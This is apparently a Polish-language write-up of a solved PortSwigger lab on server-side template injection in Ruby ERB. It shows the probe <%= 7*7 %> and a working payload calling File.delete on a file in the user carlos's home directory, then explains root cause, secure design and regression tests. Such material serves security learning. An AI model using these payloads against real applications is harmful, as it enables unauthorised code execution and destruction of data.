# Lab: Basic Server-Side Template Injection - ERB

## Platforma

PortSwigger Web Security Academy

Lab:

- https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic

## Status

**Solved**

## Cel

Uzyc niebezpiecznej konstrukcji szablonu ERB, aby usunac `morale.txt` z katalogu domowego Carlosa.

Sciezka docelowa byla podana w opisie labu. Nie zostala odkryta przez filesystem enumeration.

## Podatna funkcja

Flow produktu out-of-stock powodowal wyswietlenie komunikatu na stronie glownej.

Request zawieral:

```http
GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock
```

## Kontrolowany input

```text
message
```

Poczatkowo myslalem, ze istotny jest `productId`, bo przegladalem product requests. To bylo bledne. `productId` wybieral produkt, a `message` bylo wartoscia przekazana do podatnego flow renderowania.

## Krok 1: potwierdz reflection

Zmienilem wartosc na unikalny marker:

```http
GET /?message=SSTI_TEST_123
```

Odpowiedz zawierala:

```html
<div>SSTI_TEST_123</div>
```

### Dowod

To potwierdzilo:

- parametr byl kontrolowalny,
- wartosc byla odbita w odpowiedzi,
- lokalizacja outputu byla znana.

Nie potwierdzilo template evaluation.

## Krok 2: potwierdz ewaluacje ERB

Opis labu identyfikowal ERB. Uzylem nieszkodliwego wyrazenia arytmetycznego w ERB output syntax:

```erb
<%= 7*7 %>
```

Odpowiedz zawierala:

```html
<div>49</div>
```

### Dowod

Serwer zwrocil wynik wyrazenia zamiast literalnej skladni szablonu.

```text
message input
  -> ERB parser/evaluator
  -> calculated result
  -> generated HTML
```

To potwierdzilo SSTI.

## Krok 3: wykonaj cel labu

Nie znalem Ruby, wiec musialem znalezc Ruby API do usuwania pliku.

Ruby dostarcza:

```ruby
File.delete(path)
```

Finalne wyrazenie w autoryzowanym labie wywolalo `File.delete()` ze sciezka podana przez PortSwigger:

```erb
<%= File.delete('/home/carlos/morale.txt') %>
```

Po URL-encodingu zostalo wyslane przez podatny parametr `message`.

### Dlaczego `File.delete()`?

- ERB ocenial Ruby.
- Ruby ma bezposrednie filesystem API.
- Uruchamianie shella i `rm` nie bylo potrzebne.
- To jasno pokazalo, ze SSTI moze dotrzec do niebezpiecznego server-side API.

## Wynik

Plik zostal usuniety, a status labu zmienil sie na solved.

## Impact

Wysoki impact zostal pokazany, bo wyrazenie szablonu kontrolowane przez atakujacego moglo zmienic filesystem serwera w granicach uprawnien procesu aplikacji.

Dowod nie potwierdzal root ani nieograniczonego dostepu do filesystemu. Osiagalny impact nadal zalezy od uprawnien procesu.

## Root cause

Aplikacja wstawila kontrolowana przez uzytkownika wartosc `message` do ERB template source, a potem ja wyrenderowala.

```text
user input became template code
```

Podatny design pomylil dane z wykonywalna skladnia szablonu.

## Bezpieczna implementacja

- Uzyj statycznego ERB template kontrolowanego przez developera.
- Przekazuj komunikat tylko jako zmienna/wartosc danych.
- Nie konstruuj ERB source przez konkatenacje request input.
- Preferuj staly identyfikator statusu, na przyklad `out_of_stock`, mapowany na komunikat kontrolowany przez serwer.
- Ogranicz template context i uprawnienia procesu.
- Nie ujawniaj szczegolowych bledow ERB na produkcji.

## Testy regresji

### Test ewaluacji

Gdy `message` zawiera ERB syntax, output musi zawierac tekst literalny albo encoded i nie moze zawierac obliczonego wyniku.

### Test side effect

Input wygladajacy jak template syntax nie moze wywolywac metod Ruby ani tworzyc, modyfikowac lub usuwac plikow w srodowisku testowym.

### Test funkcjonalny

Poprawny komunikat out-of-stock musi nadal renderowac sie po poprawce.

## Co zle zrozumialem

- Poczatkowo wybralem `productId` zamiast `message`.
- Najpierw traktowalem reflection tak, jakby moglo juz potwierdzac SSTI.
- Nie wiedzialem, ze sciezka pliku pochodzi bezposrednio z opisu labu.
- Nie znalem Ruby API `File.delete()`.
- Poczatkowo opisywalem fix glownie jako sanitizacje.
- Nie umialem od razu zdefiniowac testu regresji odrozniajacego reflection od evaluation.

## Finalny wniosek

Udane wyrazenie bylo mniej wazne niz sekwencja rozumowania:

```text
find controlled input
  -> prove reflection
  -> prove template evaluation
  -> identify the runtime capability needed for the objective
  -> demonstrate impact
  -> explain root cause and secure design
```
